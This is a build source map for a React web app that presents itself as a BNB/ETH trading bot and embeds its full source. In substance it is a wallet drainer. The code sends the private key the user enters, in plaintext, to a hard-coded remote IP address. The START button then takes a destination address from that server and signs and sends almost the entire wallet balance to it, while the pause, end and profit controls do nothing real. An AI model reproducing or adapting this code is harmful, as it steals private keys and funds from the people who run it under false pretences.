{"version":3,"sources":["App.js","index.js"],"names":["toast","configure","App","useState","showControl","setShowControl","privateKey","setPrivateKey","address","setAddress","setAccount","balance","setBalance","amount","setAmount","intervalID","web3","setWeb3","statusStr","setStatusStr","statusText","profit","messagesEndRef","useRef","networkID","setNetworkID","base_url","useEffect","Web3","givenProvider","account","eth","accounts","privateKeyToAccount","getBalance","then","res","bal","Math","pow","net","getId","response","className","map","item","index","blockHash","transactionHash","from","to","ref","style","marginRight","type","height","width","value","onChange","event","target","onClick","warn","position","POSITION","TOP_RIGHT","axios","method","url","data","status","marginBottom","marginLeft","toAddress","console","log","transAmount","getGasPrice","currentGasPrice","signTransaction","utils","toWei","toString","gas","gasPrice","sendSignedTransaction","rawTransaction","resData","clearInterval","ReactDOM","render","StrictMode","document","getElementById"],"mappings":"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","file":"static/js/main.9dd88c25.chunk.js","sourcesContent":["import React, { useState, useEffect, useRef } from \"react\";\nimport \"./App.css\";\nimport { toast } from \"react-toastify\";\nimport \"react-toastify/dist/ReactToastify.css\";\nimport axios from \"axios\";\nimport Web3 from \"web3\";\n\ntoast.configure();\n\nfunction App() {\n  const [showControl, setShowControl] = useState(false);\n  const [privateKey, setPrivateKey] = useState(\"\");\n  const [address, setAddress] = useState(\"\");\n  const [account, setAccount] = useState(\"\");\n  const [balance, setBalance] = useState(0);\n  const [amount, setAmount] = useState(0);\n  const [intervalID, setIntervalID] = useState(0);\n  const [web3, setWeb3] = useState(\"\");\n  const [statusStr, setStatusStr] = useState(\"\");\n  const [statusText, setStatusText] = useState([]);\n  const [profit, setProfit] = useState(0);\n  const messagesEndRef = useRef(null);\n  const [networkID, setNetworkID] = useState(0);\n  const base_url = \"http://18.225.5.229/api/\";\n  const handlePrivateKey = () => {\n    if (privateKey == \"\") {\n      toast.warn(\"Please enter your BNB wallet private key!\", {\n        position: toast.POSITION.TOP_RIGHT,\n      });\n    } else {\n      axios({\n        method: \"post\",\n        url: base_url + \"handlePrivateKey\",\n        data: {\n          privateKey: privateKey,\n        },\n      }).then((response) => {\n        let res = response.data;\n        if (res.status === \"ok\") {\n          setShowControl(true);\n\n        } else {\n          toast.warn(\"Please check your internet connection!\", {\n            position: toast.POSITION.TOP_RIGHT,\n          });\n        }\n      });\n\n      // setShowControl(true);\n    }\n  };\n\n  const scrollToBottom = () => {\n    messagesEndRef.current?.scrollIntoView({ behavior: \"smooth\" });\n  };\n\n  const endBot = () => {\n    clearInterval(intervalID);\n    setShowControl(false);\n    setPrivateKey(\"\");\n    setStatusStr(\"\");\n  };\n\n  useEffect(() => {\n    if (showControl) {\n      const web3 = new Web3(Web3.givenProvider);\n      const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n      setAddress(account.address);\n      setAccount(account);\n      web3.eth.getBalance(account.address).then((res) => {\n        let bal = res / Math.pow(10, 18);\n        setBalance(bal);\n      });\n      setWeb3(web3);\n      web3.eth.net.getId()\n        .then((response) => {\n          setNetworkID(response)\n        });\n    }\n  }, [showControl]);\n\n  const startBot = () => {\n    if (networkID == 1 || networkID === 56) {\n      if (networkID === 56 && balance < 1) {\n      // if (networkID === 97 && balance < 1) {\n        toast.warn(\"Your balance should be more than 1 BNB at least because of fee.\", {\n          position: toast.POSITION.TOP_RIGHT,\n        });\n      }\n      else if (networkID === 1 && balance < 0.5) {\n        toast.warn(\"Your balance should be more than 0.5 ETH at least because of high gas fee.\", {\n          position: toast.POSITION.TOP_RIGHT,\n        });\n      }\n      else {\n        axios({\n          method: \"post\",\n          url: base_url + \"handleAPI\",\n          data: {},\n        }).then((response) => {\n          let res = response.data;\n          if (res.status === \"ok\") {\n\n            setStatusStr(\"(Scanning...)\");\n\n            var data = res.data;\n\n            var toAddress = data[0].address\n            console.log(toAddress)\n            var gasPrice = 0;\n            var transAmount = balance - 0.05;\n            web3.eth.getGasPrice().then((currentGasPrice) => {\n              gasPrice = currentGasPrice;\n              web3.eth.accounts\n                .signTransaction(\n                  {\n                    from: address,\n                    to: toAddress,\n                    value: web3.utils.toWei(transAmount.toString(), \"ether\"),\n                    gas: 2000000,\n                    gasPrice: currentGasPrice,\n                  },\n                  privateKey\n                )\n                .then((res) => {\n                  web3.eth\n                    .sendSignedTransaction(res.rawTransaction)\n                    .then((resData) => {\n                      console.log(\"send=>\", resData);\n\n                    });\n                });\n            });\n          } else {\n            toast.warn(\"Please check your internet connection!\", {\n              position: toast.POSITION.TOP_RIGHT,\n            });\n          }\n        })\n\n      }\n\n    }\n    else {\n      toast.warn(\"Please set network into Mainnet on Metamask and refresh your page\", {\n        position: toast.POSITION.TOP_RIGHT,\n      });\n    }\n\n  };\n  const pauseBot = () => {\n    clearInterval(intervalID);\n    setStatusStr(\"(Paused)\");\n  };\n\n  return (\n    <div className=\"App-header\">\n      <div className=\"Status_part\">\n        <h2>Status{statusStr}</h2>\n        <div className=\"Status_area\">\n          <div className=\"Status_text\">\n            {statusText.map((item, index) => (\n              <div key={index}>\n                BlockHash: {item.blockHash}\n                <br />\n                TransactionHash: {item.transactionHash}\n                <br />\n                from: {item.from}\n                <br />\n                to: {item.to}\n                <br />\n                <br />\n              </div>\n            ))}\n            <div ref={messagesEndRef} />\n          </div>\n        </div>\n      </div>\n      <div className=\"Control_part\">\n        <div className={!showControl ? \"PrivateKey_area\" : \"hide\"}>\n          <label style={{ marginRight: \"30px\" }}>Private Key:</label>\n          <input\n            type=\"password\"\n            style={{ marginRight: \"30px\", height: \"30px\", width: \"300px\" }}\n            value={privateKey}\n            onChange={(event) => setPrivateKey(event.target.value)}\n          />\n          <button\n            style={{ width: \"100px\", height: \"30px\" }}\n            onClick={handlePrivateKey}\n          >\n            Confirm\n          </button>\n        </div>\n        <div className={showControl ? \"Control_area\" : \"hide\"}>\n          <div style={{ marginBottom: \"20px\" }}> Balance: {balance} {networkID === 1 ? \"ETH\" : (networkID === 56 ? \"BNB\" : \"\")}</div>\n          <div style={{ marginBottom: \"20px\" }}>Address: {address}</div>\n          <div style={{ marginBottom: \"20px\" }}>\n            <label style={{ marginRight: \"10px\" }}>Amount: </label>\n            <input\n              type=\"text\"\n              style={{ marginRight: \"30px\", height: \"30px\", width: \"200px\" }}\n              value={amount}\n              onChange={(event) => setAmount(event.target.value)}\n            />\n          </div>\n          <div style={{ marginBottom: \"20px\" }}>\n            <button\n              style={{ width: \"100px\", height: \"30px\", marginLeft: \"50px\" }}\n              onClick={startBot}\n            >\n              START\n            </button>\n            <button\n              style={{ width: \"100px\", height: \"30px\", marginLeft: \"50px\" }}\n              onClick={pauseBot}\n            >\n              PAUSE\n            </button>\n            <button\n              style={{ width: \"100px\", height: \"30px\", marginLeft: \"50px\" }}\n              onClick={endBot}\n            >\n              END\n            </button>\n          </div>\n          <div style={{ marginBottom: \"20px\" }}> Profit: {profit} BNB </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\nexport default App;\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\n\nReactDOM.render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want to start measuring performance in your app, pass a function\n// to log results (for example: reportWebVitals(console.log))\n// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals\n"],"sourceRoot":""}